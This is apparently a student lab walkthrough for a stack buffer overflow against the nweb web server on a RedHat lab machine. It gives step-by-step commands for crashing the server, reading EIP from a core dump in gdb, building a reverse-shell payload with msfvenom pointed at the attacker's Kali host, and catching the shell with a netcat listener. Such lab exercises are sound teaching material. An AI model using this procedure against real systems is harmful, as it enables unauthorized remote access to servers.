HowToCompile
# Need the ip of the machine to attack
1. To start log into the RH8 machine and get the ip using ip a or ipconfig 
# start the program to attack on the port you wish to target
2. on the rh8 machine start nweb on port 8888 by using ./nweb 8888
# To do the exploit we need the eip address to be overwritten by the address we send to the redhat machine. Since the stack in x86 architecture is allocated 1024 bytes, we need to calculate how many bytes we need to send so the eip address is overwritten by the address of our attack after the reverse shell code
3. To start we try this command:  nc VictimIP PORT_NUM then
GET /index.html HTTP/1.0. to see if the server is running. 
#After confirming the server is running. Send 1024 A's in a request to see what a buffer overflow looks like
4. You could tie it to a variable like this: PRE =`perl -e "print '\x90'*1024"' and do a simple Get $PRE to get an idea of what the seg fault looks like
#To verify, we can look at the redhat machine and make sure the eip was overwritten and we generated a seg fault.
5. In redhat if you ls, there should be a core file that was generated due to the instruction, to look at this core, you can do gdb --core core#corenumber#. This command will generate the eip, and then to further explore the stack code you can do the command x/1024 $eip -1024.
6 Once confirming you can generate a buffer overflow, generate your reverse shell code using Metasploit: msfvenom -p linux/x86/shell_reverse_tcp LHOST=KALIIP LPORT=CHOSENPORT -f rb -e x86/alpha_mixed
7. I then made a ruby file that is attached titled ExploitScript.txt to make things more simple. 
8. The PRE variable is the NOP sled to take up the most amount of bytes to fill the space. The POST variable is the address where the NOPS end in the stack. The buf - is the reverse shell code generated by Metasploit
9. The attack command simply concatenates the three variables, and sends them to the redhat machine
10. Open another kali terminal and run the command nc -lvp <Port> where the port is of your choosing, but not 8888. This command will start a listener to verify you are able to remote into the RedHat machine.
11. Run the file using the command ruby <filename>.rb
12. Should nothing happen, look in the redhat machine for another core file, and look in the eip. If the address is not matching what you have in the file then there is an offset issue. You may need to add more NOPs or allocate more address space.
13. Once figuring out the spacing, the eip should be overwritten with your POST address, but should be backwards as we are sending in a reverse shell. 
14. Should you figure out the spacing after sending the command, the listener will refresh and you should have access to the redhat machine.